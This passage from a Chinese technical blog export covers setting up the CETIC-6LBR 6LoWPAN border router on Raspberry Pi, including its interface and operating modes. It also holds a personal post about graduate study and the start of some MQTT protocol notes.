<a id="more"></a>
<h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><h5 id="下载6LBR"><a href="#下载6LBR" class="headerlink" title="下载6LBR"></a>下载6LBR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/cetic/6lbr</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> 6lbr</span></div><div class="line"><span class="meta">$</span><span class="bash"> git submodule update --init --recursive</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> examples/6lbr</span></div><div class="line"><span class="meta">$</span><span class="bash"> git checkout develop-1.4.1 <span class="comment">#根据6LBR项目的版本修改版本号，目前稳定版为1.4.1</span></span></div></pre></td></tr></table></figure>
<h5 id="编译6LBR"><a href="#编译6LBR" class="headerlink" title="编译6LBR"></a>编译6LBR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make all    <span class="comment">#如果要使用1.4以下版本，只要把命令改为make TARGET=native all即可</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> make plugins</span></div><div class="line"><span class="meta">$</span><span class="bash"> make tools</span></div></pre></td></tr></table></figure>
<h5 id="安装6LBR"><a href="#安装6LBR" class="headerlink" title="安装6LBR"></a>安装6LBR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make install</span></div><div class="line"><span class="meta">$</span><span class="bash"> make plugins-install</span></div><div class="line"><span class="meta">$</span><span class="bash"> update-rc.d 6lbr defaults</span></div></pre></td></tr></table></figure>
<p>　　<strong>注意：建议安装稳定版本，低于1.4的版本有些功能好像不支持，比如NAT64，而最新版本则亲测不稳定。</strong></p>
<h4 id="6LBR配置"><a href="#6LBR配置" class="headerlink" title="6LBR配置"></a>6LBR配置</h4><p>　　默认情况下 6LBR 是没有配置文件的，只是在 /etc/6lbr/ 目录下给了几个例子，我们需要自己新建 conf.d 文件。</p>
<h5 id="配置6LBR模式"><a href="#配置6LBR模式" class="headerlink" title="配置6LBR模式"></a>配置6LBR模式</h5><p>　　配置为路由器模式，在 /etc/6lbr/conf.d 文件夹下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MODE=ROUTER</div></pre></td></tr></table></figure>
<h5 id="接口配置"><a href="#接口配置" class="headerlink" title="接口配置"></a>接口配置</h5><p>　　你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是 eth0）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">RAW_ETH=0</div><div class="line">BRIDGE=1</div><div class="line">CREATE_BRIDGE=0</div><div class="line">DEV_ETH=eth0</div><div class="line">DEV_BRIDGE=br0</div><div class="line">DEV_TAP=tap0</div></pre></td></tr></table></figure>
<p>　　你还需要创建一个桥接接口br0，在 /etc/6lbr 目录下，我们提供了两个 /etc/network/interfaces 文件的例子。例如，如果你使用 DHCP，文件的内容应该是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">...</div><div class="line"></div><div class="line">iface eth0 inet static</div><div class="line">address 0.0.0.0</div><div class="line"></div><div class="line">auto br0</div><div class="line">iface br0 inet dhcp</div><div class="line">    bridge_ports eth0</div><div class="line">    bridge_stp off</div><div class="line">    up echo 0 &gt; /sys/devices/virtual/net/br0/bridge/multicast_snooping</div><div class="line">    post-up ip link set br0 address `ip link show eth0 | grep ether | awk &apos;&#123;print $2&#125;&apos;`</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
<h4 id="SLIP-RADIO配置"><a href="#SLIP-RADIO配置" class="headerlink" title="SLIP-RADIO配置"></a>SLIP-RADIO配置</h4><h5 id="接线说明"><a href="#接线说明" class="headerlink" title="接线说明"></a>接线说明</h5><p>　　使用 USB 转 TTL 模块，将 Raspberry Pi 与 SLIP-Radio（即一个 Contiki 节点，使用 cc538dk）连接起来。</p>
<h5 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> 6lbr/example/</span></div><div class="line"><span class="meta">$</span><span class="bash"> make TARGET=cc2538dk</span></div></pre></td></tr></table></figure>
<p>　　得到 bin 或者 hex 文件，用于下一步的烧录。</p>
<h5 id="烧写程序"><a href="#烧写程序" class="headerlink" title="烧写程序"></a>烧写程序</h5><p>　　cc2538dk 程序烧写步骤请参考博客：<a href="http://fanzhenyu.me/2017/02/18/Contiki%20CC2538dk%20%E4%B8%B2%E5%8F%A3%E4%B8%8B%E8%BD%BD%E7%A8%8B%E5%BA%8F/" target="_blank" rel="external">Contiki CC2538dk 串口下载程序</a></p>
<h4 id="启动6LBR"><a href="#启动6LBR" class="headerlink" title="启动6LBR"></a>启动6LBR</h4><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> service 6lbr start</span></div></pre></td></tr></table></figure>
<h4 id="节点配置"><a href="#节点配置" class="headerlink" title="节点配置"></a>节点配置</h4><p>　　节点我们暂时采用 6LBR 提供的 demo 进行测试，该 demo 位于 6lbr-develop/examples/6lbr-demo，后续博客在讲解如何进行移植。</p>
<h5 id="编译程序-1"><a href="#编译程序-1" class="headerlink" title="编译程序"></a>编译程序</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> examples/6lbr-demo</span></div><div class="line"><span class="meta">$</span><span class="bash"> make TARGET=cc2538dk</span></div></pre></td></tr></table></figure>
<p>　　得到 bin 或者 hex 文件，用于下一步的烧录。</p>
<h5 id="烧写程序-1"><a href="#烧写程序-1" class="headerlink" title="烧写程序"></a>烧写程序</h5><p>　　cc2538dk 程序烧写步骤请参考博客：<a href="http://fanzhenyu.me/2017/02/18/Contiki%20CC2538dk%20%E4%B8%B2%E5%8F%A3%E4%B8%8B%E8%BD%BD%E7%A8%8B%E5%BA%8F/" target="_blank" rel="external">Contiki CC2538dk 串口下载程序</a></p>
<h4 id="效果测试"><a href="#效果测试" class="headerlink" title="效果测试"></a>效果测试</h4><p>　　你需要找一台与你的树莓派在同一个局域网的电脑，将其 IPv6 地址设定为 bbbb::101，然后打开浏览器访问 bbbb::100，即可看到 6LBR 的配置界面。可以在网页端对网络进行各种配置，具体教程后续博客会介绍，这里不展开了。6lbr 提供的 demo 默认都是支持 RPL 的，所以我们可以使用几个节点，然后组成如下的传感网络。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/31-1.png" alt="31-1"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>6LBR</tag>
      </tags>
  </entry>
  <entry>
    <title>心之所向，素履以往</title>
    <url>/2017/03/27/%E5%BF%83%E4%B9%8B%E6%89%80%E5%90%91%EF%BC%8C%E7%B4%A0%E5%B1%A5%E4%BB%A5%E5%BE%80/</url>
    <content><![CDATA[<p>　　凡心所向，素履所往，生如逆旅，一苇以航。   －－－七堇年《尘曲》</p>
<a id="more"></a>
<p>　　很久很久没有写过关于Life的博客了吧，或许真的是因为我懒，又或许如此安静平凡的生活真的没什么可写的，但是既然兴致来了，那就写写吧。</p>
<p>　　来中南学习已经一个半月了，谈谈感受吧。提前来体验研究生生活是我自己的选择，对于这个选择我一直都坚信是正确的，现在想想也确实收获不小。提前来这边有两个目的，一是完成毕业设计，二是熟悉研究生阶段将要研究的方向。目前看来，虽然遇到很多困难，但是二者都在稳步前进。</p>
<p>　　在这边相对自由，没有那么多的约束，但是学习的氛围却很浓，导师和师兄师姐也都很好，所以也很快适应了这边的生活。其实，真的没说错，越好的学校学习气氛越好。原以为自己已经够努力了，来到这边才知道什么叫努力，特别佩服博士师兄，每天到得早回得晚，做的事情也多。没有太多的约束，也没有老师天天管着，但是大家都会很自觉地在实验室学习，我也慢慢习惯在实验室待一整天的生活。</p>
<p>　　最近很认同朋友说的一句话：出了社会才知道自己根本不算什么。确实啊，来到这边自己也是很有压力的，尽管你在原来的学校可能已经是比较厉害的了，可是来到这里你才发现什么叫做差距，确实还有很多需要努力的地方，但是我也相信，我还有时间可以赶得上。</p>
<p>　　在这边最喜欢的应该是每周的交流与讨论了，其实自己早就很向往这种学术沙龙式的交流活动。每周的组会，说不上多么高大上，但是自己的汇报以及导师和师兄师姐的提问，都会带来一些思考。期间还经历了两次论文分享，自己也分享了一次。论文分享就是先自己去读比较新的文章，然后做PPT给大家汇报文章的内容，然后大家针对文章进行提问展开讨论。从一开始不知道如何提问，到慢慢参与他们的讨论，我发现每一次论文分享都是思维的碰撞。我分享的那次讲得确实不好，总结下来，一方面是自己给自己太大的压力以及自己的不自信，另一方面是自己对TCP/IP体系结构的很多协议与实现机制没有深入的认识。另外，我也在尝试着参与师兄师姐的项目，和他们一起讨论解决方案，虽然每次都觉得没帮上什么忙，但是他们的思路以及互相的讨论也给了我不少的启发。</p>
<p>　　说实话，真的特别特别喜欢这样的学习交流，每次的讨论都会带来很多问题，然后就可以带着问题去寻找答案，所以说，每周除了做毕设，还要尝试着去解决一些问题，这也是每天都过得还算充实的原因。</p>
<p>　　让我突然觉得自己有所收获的是最近回本科学校，拿着毕业设计的前两章内容给老师看，他说这样写不行，我把本科生论文写成研究生论文了，突然意识到，这或许就是这段时间的进步吧。这边导师强调做毕设得过程中多了解网络协议，这就是和本科的区别啊，本科往往注重的是如果实现一个设计，而研究生则不仅仅满足于此，因为还要做研究，那么其中的协议就要搞得清清楚楚，甚至还要去优化协议。让我开心的是，我也竟然也开始有了这种思维，而不仅仅局限于如何去实现我的设计。</p>
<p>　　这段时间除了实验室的学习，依然也有自己的生活，看了不少的纪录片，关于社会、关于生命、关于旅行、关于历史等等，很多精彩的纪录片真的值得去看，也值得去思考。当然，也依然在坚持做一直觉得重要的事情，也就是写写博客，学学自己想学的，总之，一切都那么简单那么平静。</p>
<p>　　近来，自己的博客也慢慢得到一些人的喜欢，也有一些朋友通过博客来加好友，很难得能够和这些有共同兴趣爱好的朋友一起交流一起进步，这或许也是写博客的意义吧。这段时间我也回学校好几次，去拜访过老师，也去给实验室的学弟学妹做过分享，也去见过老友。很开心的是，室友也都找到工作了，只是突然发现，真的真的马上就要毕业了。上次还说，现在回去还能有地方睡，想着以后在农大就没有一张床随时给我备着了。莫名的伤感啊，大学四年，马上，大家就要各奔东西了。</p>
<p>　　写着写着就有写到毕业去了，这件事真的不能多想，一想就停不下来，还是就此打住吧。最近特别喜欢希望一句话：心之所向，素履以往。不管是目前还在努力前进的自己还是最近参加研究生复试的朋友、接下来还要找工作或者考公务员的朋友，我想大家都是在追逐梦想，所以，希望大家加油，也希望大家都能如愿。</p>
<p>　　时间不早了，零零散散写了很多，我不是一个好的作者，但是有空我还是会再写写Life的。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>6LoWPAN Border Router：6LBR 接口配置</title>
    <url>/2017/03/21/6LoWPAN%20Border%20Router%EF%BC%9A6LBR%20%E6%8E%A5%E5%8F%A3%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　6LBR 系列博文之（二） - 6LBR 接口配置。</p>
<a id="more"></a>
<p>　　注意：本文只与基于 Linux 的 6LBR 有关。</p>
<p>　　在 Linux 平台上，你需要将 6LBR 应用程序链接到你的 LAN 网络，为此，你有三种可能性。（为了使清晰起见，您可以假设 6LBR 是在 Linux 主机上运行的 VM）</p>
<h4 id="以太网直连"><a href="#以太网直连" class="headerlink" title="以太网直连"></a>以太网直连</h4><p>　　这是最简单的方法，但也是最有限的一种，您的 Linux 主机将无法直接与 6LBR 和 WSN 通信。如名称所示， 6LBR 直接使用配置的以太网接口发送和接收数据包。</p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/connection/raw-ethernet.png" alt="raw-ethernet"></p>
<p>　　你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是 eth0）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">RAW_ETH=1</div><div class="line">BRIDGE=0</div><div class="line">DEV_ETH=eth0</div></pre></td></tr></table></figure>
<h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><p>　　此模式需要更多配置，但是你将能够与 Linux 主机的 6LBR 通信。在这种模式下，6LBR 将创建一个虚拟以太网接口，通常为 tap0。您需要将其桥接到以太网接口，以提供连接。创建的桥接接口将替换您的以太网接口用于所有目标。</p>
<p>　　重要的提示：你的以太网驱动程序必须支持混杂模式，如果不能，桥将无法正常工作，你将与 6LBR 间歇性连接。 Beaglebone 的以太网驱动程序不支持混杂模式！</p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/connection/bridge.png" alt="bridge"></p>
<p>　　你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是 eth0）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">RAW_ETH=0</div><div class="line">BRIDGE=1</div><div class="line">CREATE_BRIDGE=0</div><div class="line">DEV_ETH=eth0</div><div class="line">DEV_BRIDGE=br0</div><div class="line">DEV_TAP=tap0</div></pre></td></tr></table></figure>
<p>　　你还需要创建一个桥接接口 br0，在 /etc/6lbr 目录下，我们提供了两个 /etc/network/interfaces 文件的例子。例如，如果你使用 DHCP，文件的内容应该是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">...</div><div class="line"></div><div class="line">iface eth0 inet static</div><div class="line">address 0.0.0.0</div><div class="line"></div><div class="line">auto br0</div><div class="line">iface br0 inet dhcp</div><div class="line">    bridge_ports eth0</div><div class="line">    bridge_stp off</div><div class="line">    up echo 0 &gt; /sys/devices/virtual/net/br0/bridge/multicast_snooping</div><div class="line">    post-up ip link set br0 address `ip link show eth0 | grep ether | awk &apos;&#123;print $2&#125;&apos;`</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
<p>　　如你所见，以太网接口不再配置，它已被 br0 替换。</p>
<p>　　可以在 6LBR 启动时创建网桥，但是这样做的结果是，当以太网接口加入网桥时，你将丢失所有现有连接。如果你真的想要这种模式，你必须添加到你的 6lbr.conf 文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">CREATE_BRIDGE=1</div></pre></td></tr></table></figure>
<h4 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h4><p>　　这种模式是最强大的，也是最复杂的。您不需要创建连接 tap0 接口和 eth0 接口的网桥，而是依靠 Linux 主机栈来在两个接口之间进行路由，在IP级使用实际路由或以太网级使用 ebtables。这只有在有多个接口或复杂路由时，或者当您的以太网驱动程序不支持混杂模式时才有用。</p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/connection/routing.png" alt="router"></p>
<p>　　6lbr.conf 文件的配置很简单：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">RAW_ETH=0</div><div class="line">BRIDGE=0</div><div class="line">DEV_ETH=eth0</div><div class="line">DEV_TAP=tap0</div></pre></td></tr></table></figure>
<p>　　可以通过在 /etc/sysctl.conf 中添加以下两行来启用 IP 转发：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">net.ipv4.ip_forward = 1</div><div class="line">net.ipv6.conf.all.forwarding=1</div></pre></td></tr></table></figure>
<p>　　为了避免在 tap0 和 eth0 接口之间有一个不必要的子网，最好使用没有前缀自动配置的 SmartBridge 模式。</p>
<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><p>　　使用桥接模式时，树莓派ip地址经常跳变，解决办法：</p>
<p>　　当接口添加到网桥时，其所有配置都将丢失。因此，当 6LBR 启动并将以太网接口添加到其网桥时，连接将丢失。解决方案是在系统引导时使用提供的接口示例文件（在 /etc/6lbr/interfaces.*.example 中）创建桥接，并在 /etc/6lbr/6lbr.conf 中设置 CREATE_BRIDGE = 0。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>6LBR</tag>
      </tags>
  </entry>
  <entry>
    <title>6LoWPAN Border Router：6LBR 之运行模式</title>
    <url>/2017/03/16/6LoWPAN%20Border%20Router%EF%BC%9A6LBR%20%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>　　　　6LBR 系列博文之（一） - 6LBR 运行模式。</p>
<a id="more"></a>
<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>　　6LBR 可以在三种类别的模式中运行：网桥，路由器和透明网桥。这三个类别又被细分为以下模式：</p>
<ul>
<li><p>Bridge</p>
<ul>
<li>SmartBridge</li>
</ul>
</li>
<li><p>Router</p>
<ul>
<li><p>Router</p>
</li>
<li><p>NDP-Router</p>
</li>
<li><p>6LR</p>
</li>
<li><p>RPL-Root</p>
</li>
</ul>
</li>
<li><p>Transparent Bridge</p>
<ul>
<li><p>RPL-Replay</p>
</li>
<li><p>FullTransparentBridge</p>
</li>
</ul>
</li>
</ul>
<h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p>　　在网桥模式中，只是实现了 802.15.4 接口和以太网接口的桥接，即根据链路层的地址进行网络数据包的转发。在网桥模式中，6LBR 又可分为智能网桥模式和透明网桥模式。</p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/bridge-mode-highlevel-large.png" alt="bridge"></p>
<h4 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h4><p>　　路由器模式能够实现 IPv6 网络和 6LoWPAN 网络之间真正的路由功能，它将无线传感器网络当作一个独立的子网，因此以太网和无线网的 IPv6 地址前缀不相同，以 6LBR 作为根节点的 RPL 实例管理整个无线传感器网络。</p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/router-mode-highlevel-large.png" alt="router"></p>
<h4 id="模式的详细介绍"><a href="#模式的详细介绍" class="headerlink" title="模式的详细介绍"></a>模式的详细介绍</h4><h5 id="智能网桥模式"><a href="#智能网桥模式" class="headerlink" title="智能网桥模式"></a>智能网桥模式</h5><p>　　在这种模式下，6LBR 充当智能桥，允许将标准的基于 IPv6 的网络与基于 RPL 的 WSN Mesh 网格互连。智能网桥在以太网端充当 NDP 代理并且使用 NDP 参数配置 WSN Mesh 网络。源和目地 MAC 地址被转换，系统能够解析数据包的源 MAC 地址和目的 MAC 地址，ICMPv6 包所包含的地址也会被解析出来。智能网桥模式允许你：</p>
<ul>
<li><p>将 WSN Mesh 网络无缝集成到现有的基于 NDP 的 IPv6 网络中，智能网桥将使用 NDP 提供的配置来相应地设置 WSN 网格。</p>
</li>
<li><p>将多个 WSN Mesh 网络与自己 DODAG 聚合到一个虚拟的 IPv6 子网。支持节点移动性，在两个 WSN 重叠的情况下，如果一个节点获得更好的链路，它可以从一个 WSN 切换到另一个，如从虚拟 IPv6 子网看到的，由于 NDP 代理，该交换机将几乎不可见。</p>
</li>
</ul>
<p><img src="https://github.com/cetic/6lbr/wiki/images/smartbridge-mode-details-large.png" alt="smartbridge"></p>
<h5 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h5><p>　　在这种模式下，6LBR 作为一个完全成熟的 IPv6 路由器，互连两个 IPv6 子网。WSN 子网由 RPL 协议管理，以太网子网由 IPv6 NDP 管理。在这种模式下，6LBR 通过包过滤器模块为 Contiki 提供了一个虚拟的第二接口。此模式更像是以太网和 6Lowpan RPL 之间的网关。来自 RPL 侧的传出报文的源地址将更新为 eth_ip_local_addr。</p>
<p>　　在路由模式你可以：</p>
<ul>
<li><p>将 WSN 网格隔离到其自己的子网中，因此可以清楚地标识 WSN 节点。</p>
</li>
<li><p>…</p>
</li>
</ul>
<p>　　<strong>注意：前缀切换能力支持跨不同 WSN 子网的节点移动性，在这种情况下，节点将根据新 WSN 的前缀获得新地址。</strong></p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/router-mode-details-large.png" alt="router"></p>
<h5 id="透明网桥模式"><a href="#透明网桥模式" class="headerlink" title="透明网桥模式"></a>透明网桥模式</h5><p>　　在这些模式下，6LBR 充当独立网桥，提供基本的交换功能。所有在以太网接口上定位到 802.15.4 接口的传入包或者传入的组播包被转发到 WSN 段。相反的，所有针对以太网接口的传入数据包或 802.15.4 接口上的传入组播数据包都将转发到以太网段。6LBR 有自己的地址并作为主机。源和目标 MAC 地址被转换，ICMPv6 数据包中存在的地址也被转换。</p>
<p>　　在透明桥接模式下你可以：</p>
<ul>
<li><p>聚合子 WSN 网格合并为一个全局 DODAG，由外部 RPL 根节点管理（使用 RPL 中继时）。</p>
</li>
<li><p>使用 NDP 桥接一个 IPv6 网络的一跳网格（当使用 FullTransparentBridge 时）。</p>
</li>
<li><p>使用 IPv6 网络桥接静态路由网格（使用 FullTransparentBridge 时）。</p>
</li>
<li><p>…</p>
</li>
</ul>
<p><img src="https://github.com/cetic/6lbr/wiki/images/transparentbridge-mode-details-large.png" alt="transparentbridge"></p>
<p>　　<strong>注意，我们故意省略标记控制流量的类型，因为 RPL 和 NDP 都在可能的用例中提及。</strong></p>
<h4 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h4><p>　　以下三种模式在 6lbr 的官方文档中也未做出说明，有待进一步的工作。</p>
<ul>
<li><p>NDP-Router</p>
</li>
<li><p>RPL-Root</p>
</li>
<li><p>6LR</p>
</li>
</ul>
<p>　　本文翻译自 6LBR 官方文档：<a href="https://github.com/cetic/6lbr/wiki/6LBR-Modes" target="_blank" rel="external">https://github.com/cetic/6lbr/wiki/6LBR-Modes</a>，向优秀的 CETIC-6LBR 项目致敬！</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>6LBR</tag>
      </tags>
  </entry>
  <entry>
    <title>6LoWPAN Border Router：CETIC-6LBR 介绍</title>
    <url>/2017/03/12/6LoWPAN%20Border%20Router%EF%BC%9ACETIC-6LBR%20%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>　　CETIC-6LBR 是目前国际上较为优秀的基于 Contiki 系统的 6LoWPAN 边界路由器解决方案。和现有的其他边界路由器方案相比，6LBR 是唯一一个不需要 Linux 主机的独立边界路由器，并且能够提供 IPv6/NDP 和 RPL 之间的智能互联。</p>
<a id="more"></a>
<h4 id="6LBR简介"><a href="#6LBR简介" class="headerlink" title="6LBR简介"></a>6LBR简介</h4><p>　　6LBR 的目标是连接基于 802.15.4 和 6LoWPAN 的无线传感器网络和基于以太网的现有 IPv6 有线网络。这种连接可以在网络协议栈的多个层面上实现，首先可以在数据链路层（第二层）实现，此时 6LBR 可看作成通常所说的网桥或交换机设备；其次，也可以在网络层（第三层）实现，此时 6LBR 可看作成通常所说的路由器；最后，还可以自应用层（第七层）实现，此时 6LBR 可看作成通常所说的网关设备。</p>
<p><img src="https://github.com/cetic/6lbr/wiki/images/6lbr-top-medium.png" alt="image"></p>
<p>　　6LBR 方案是在 Contiki 系统之上模拟出第二个接口，不需要对 uIP 协议栈进行大量修改，当 Contiki 系统升级时，6LBR 可以直接替换系统文件实现立即升级。而且它还实现了基于 RPL的多跳网络管理，是目前边界路由器方案中功能最强大的。</p>
<p>　　6LBR 搭建好之后就像我们平常使用的路由器那样会有一个 Web 界面，可以用来配置我们的边界路由器以及管理我们的 6LoWPAN 无线传感网络，功能十分强大。</p>
<p>　　项目地址：<a href="https://github.com/cetic/6lbr" target="_blank" rel="external">https://github.com/cetic/6lbr</a></p>
<p>　　下载地址：<a href="https://github.com/cetic/6lbr/wiki/Releases" target="_blank" rel="external">https://github.com/cetic/6lbr/wiki/Releases</a></p>
<h4 id="支持的硬件平台"><a href="#支持的硬件平台" class="headerlink" title="支持的硬件平台"></a>支持的硬件平台</h4><ul>
<li>OpenMote</li>
<li>Zolertia Ethernet IoT Gateway</li>
<li>The Redwire IO</li>
<li>The Redwire Econotag</li>
<li>TI CC2538DK</li>
<li>TI CC2650DK</li>
<li>Linux hosts</li>
<li>RaspberryPi</li>
<li>BeagleBone</li>
</ul>
<h4 id="开发教程"><a href="#开发教程" class="headerlink" title="开发教程"></a>开发教程</h4><p>　　本人目前正在研究 6LoWPAN，将 6oWPAN 无线传感网络接入 Internet 需要实现边界路由器，而 6LBR 正好是一个不错的边界路由器方案，所以我采用 CETIC-6LBR 在 Raspberry Pi 上实现了边界路由器功能。目前，国内关于 6LBR 的资料实在是比较稀缺，特别是对于英语不太好的人来说，遇到问题也比较难找到参考资料，接下来我将会写系列博客介绍 6LBR 以及如何使用 6LBR 搭建边界路由器，也欢迎喜欢的小伙伴多多交流！</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>6LBR</tag>
      </tags>
  </entry>
  <entry>
    <title>MQTT 协议学习笔记</title>
    <url>/2017/03/04/MQTT%20%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>　　MQTT（Message Queuing Telemetry Transport），即消息队列遥测传输协议，是 IBM 开发的一种轻量级、基于代理的发布/订阅式的消息传输协议。</p>
<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>　　MQTT 是一个客户端服务端架构的发布/订阅模式的消息传输协议。它的设计思想是轻巧、开放、简单、规范，因此易于实现。这些特点使得它对很多场景来说都是很好的选择，包括受限的环境如机器与机器的通信（M2M）以及物联网环境（IoT），这些场景要求很小的代码封装或者网络带宽非常昂贵。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-1.png" alt="7-1"></p>
<p>　　实现 MQTT 协议需要：客户端和服务器端。</p>
<p>　　MQTT 协议中有三种身份：发布者（Publish）、代理（Broker）（服务器）、订阅者（Subscribe）。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。</p>
<p>　　MQTT 传输的消息分为：主题（Topic）和负载（payload）两部分。</p>
<p>　　Topic，可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload）payload，可以理解为消息的内容，是指订阅者具体要使用的内容。</p>
<h5 id="MQTT客户端"><a href="#MQTT客户端" class="headerlink" title="MQTT客户端"></a>MQTT客户端</h5><p>　　一个使用 MQTT 协议的应用程序或者设备，它总是建立到服务器的网络连接。客户端可以：</p>
<ul>
<li>发布其他客户端可能会订阅的信息</li>
<li>订阅其它客户端发布的消息</li>
<li>退订或删除应用程序的消息</li>
<li>断开与服务器连接</li>
</ul>
<h5 id="MQTT服务器"><a href="#MQTT服务器" class="headerlink" title="MQTT服务器"></a>MQTT服务器</h5><p>　　MQTT 服务器以称为“消息代理”（Broker），可以是一个应用程序或一台设备。它是位于消息发布者和订阅者之间，它可以：</p>
<ul>
<li>接受来自客户的网络连接</li>
<li>接受客户发布的应用信息</li>
<li>处理来自客户端的订阅和退订请求</li>
<li>向订阅的客户转发应用程序消息</li>
</ul>
<h5 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h5><ul>
<li><p>订阅（Subscription）</p>
<p>  订阅包含主题筛选器（Topic Filter）和最大服务质量（QoS）。订阅会与一个会话（Session）关联。一个会话可以包含多个订阅。每一个会话中的每个订阅都有一个不同的主题筛选器。</p>
</li>
<li><p>会话（Session）</p>
<p>  每个客户端与服务器建立连接后就是一个会话，客户端和服务器之间有状态交互。会话存在于一个网络之间，也可能在客户端和服务器之间跨越多个连续的网络连接。</p>
</li>
<li><p>主题名（Topic Name）</p>
<p>  连接到一个应用程序消息的标签，该标签与服务器的订阅相匹配。服务器会将消息发送给订阅所匹配标签的每个客户端。</p>
</li>
<li><p>主题筛选器（Topic Filter）</p>
<p>  一个对主题名通配符筛选器，在订阅表达式中使用，表示订阅所匹配到的多个主题。</p>
</li>
<li><p>负载（Payload）</p>
<p>  消息订阅者所具体接收的内容。</p>
</li>
</ul>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
<li>使用发布/订阅消息模式，提供一对多的消息发布，解除应用程序耦合</li>
<li>对负载内容屏蔽的消息传输 </li>
<li>使用 TCP/IP 提供网络连接</li>
<li>三种消息发布服务质量(Qos)<ul>
<li>“至多一次”，即 Qos=0，会发生信息丢失，消息发布完全依赖底层 TCP/IP 网络。</li>
<li>“至少一次”，即 Qos=1，确保消息到达，但消息重复可能会发生。 </li>
<li>“只有一次”，即 Qos=2，确保消息到达一次。</li>
</ul>
</li>
<li>小型传输，开销很小（固定长度的头部是 2 字节），协议交换最小化，以降低网络流量。</li>
</ul>
<h4 id="控制报文格式"><a href="#控制报文格式" class="headerlink" title="控制报文格式"></a>控制报文格式</h4><p>　　每个 MQTT 命令消息的消息头部都包含了一个固定头部。其中一些类型的消息可能还需要一个可变头部和一个有效载荷（可理解为消息体）。</p>
<p>　　MQTT 协议通过交换预定义的 MQTT 控制包来实现的。一个 MQTT 控制包由 3 个部分组成，并总是按照如下顺序排列：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>Fixed header</td>
<td>固定报头，所有控制报文都包含</td>
</tr>
<tr>
<td>Variable header</td>
<td>可变报头，部分控制报文包含</td>
</tr>
<tr>
<td>Payload</td>
<td>有效载荷，部分控制报文包含</td>
</tr>
</tbody>
</table>
